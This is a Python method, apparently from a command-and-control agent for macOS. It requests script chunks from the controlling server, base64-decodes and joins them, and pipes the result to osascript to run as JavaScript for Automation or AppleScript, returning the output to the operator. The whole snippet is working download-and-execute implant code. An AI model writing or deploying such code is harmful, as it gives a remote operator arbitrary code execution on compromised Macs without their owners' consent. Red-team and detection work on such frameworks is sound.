    def spawn_jxa(self, task_id, file, language):
        import os
        import subprocess
        
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
            
        if cmd_code: 
            args = []
            if language == "JavaScript":
                args = ["osascript", "-l", "JavaScript", "-"]
            elif language == "AppleScript":
                args = ["osascript", "-"]

            osapipe = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE)

            osapipe.stdin.write(cmd_code.encode())
            stdout, stderr = osapipe.communicate()
            out = stderr if stderr else stdout
            return str(out)
        else: return "Failed to load script"
